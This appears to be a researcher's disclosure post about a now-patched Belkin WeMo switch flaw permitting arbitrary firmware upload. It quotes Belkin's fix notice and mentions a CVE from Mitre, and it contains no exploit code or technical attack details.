Hello
Im independently working with Mitre and Belkin on this matter so please
disregard my naiveness. Several months ago I discovered a vulnerablility on
the Belkin WeMo light switch would allow arbitrary firmware to uploaded
resulting in remote shell access.
Here is a youtube link to a PoC video I made:

I was finally able to reach Belkin and worked with them on patching the
vulnerability. I recently heard back from them and here is the
correspondence:

Daniel,
The FW for WeMo Switch and Sensor with the security fixes for some of the
issues you notified us about have shipped. The updated FW version is
WeMo_US_2.00.2176.PVT and WeMo_WW_2.00.2176.PVT (worldwide version). I
didn&#039;t register for CVE&#039;s for the vulns you found, as the process wasn&#039;t
clear for companies outside tier 1 (Microsoft, Oracle, Apple, Adobe) type
companies. We are still working on a credit page for White Hat submissions
and it will probably be a few months out.

I reached out to Mitre and they assigned me a CVE and recommended I submit
my code here. Here is the code which would allow someone to upload their
own firmware:

Mitre needs the vulnerability documented on an external site in order to
add the entry into the CVE database. If needed I can forward you the PGP
signed message from them. If you need anything else feel free to ask. I
have copies of all correspondence between Belkin., Mitre, and myself.
